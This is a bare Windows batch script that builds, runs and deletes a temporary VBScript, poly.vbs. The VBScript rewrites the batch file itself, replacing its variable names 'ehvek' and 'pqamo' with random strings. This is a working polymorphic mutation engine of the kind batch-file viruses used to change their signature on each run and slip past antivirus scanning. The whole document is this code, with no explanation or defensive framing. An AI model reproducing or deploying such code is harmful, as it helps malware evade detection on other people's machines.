@set ehvek=echo
@set pqamo=copy

%ehvek% set ff=createobject("scripting.filesystemobject")>>poly.vbs
%ehvek% set rr=ff.opentextfile(%0,1)>>poly.vbs
%ehvek% aa = rr.readall>>poly.vbs
%ehvek% rr.close>>poly.vbs
%ehvek% Randomize>>poly.vbs
%ehvek% poly = int(rnd * 3)>>poly.vbs
%ehvek% if poly = 0 or poly = 2 then>>poly.vbs
%ehvek% s = chr(int(22 * rnd) + 97)>>poly.vbs
%ehvek% rand1 = Replace(aa,"ehvek","ehvek" ^& s ^& poly)>>poly.vbs
%ehvek% rand2 = Replace(rand1,"pqamo","pqamo" ^& s ^& s ^& poly)>>poly.vbs
%ehvek% else>>poly.vbs
%ehvek% polynum = int(rnd * 7)>>poly.vbs
%ehvek% for i = 1 to polynum>>poly.vbs
%ehvek% polychar = chr(int(22 * rnd) + 97)>>poly.vbs
%ehvek% polyall = polyall + polychar>>poly.vbs
%ehvek% next>>poly.vbs
%ehvek% s = chr(int(22 * rnd) + 97)>>poly.vbs
%ehvek% rand1 = Replace(aa,"ehvek",polyall )>>poly.vbs
%ehvek% rand2 = Replace(rand1,"pqamo", s ^& polyall)>>poly.vbs
%ehvek% end if>>poly.vbs
%ehvek% set bb=ff.opentextfile(%0,2)>>poly.vbs
%ehvek% bb.write rand2>>poly.vbs
@cscript poly.vbs
@del poly.vbs
@exit

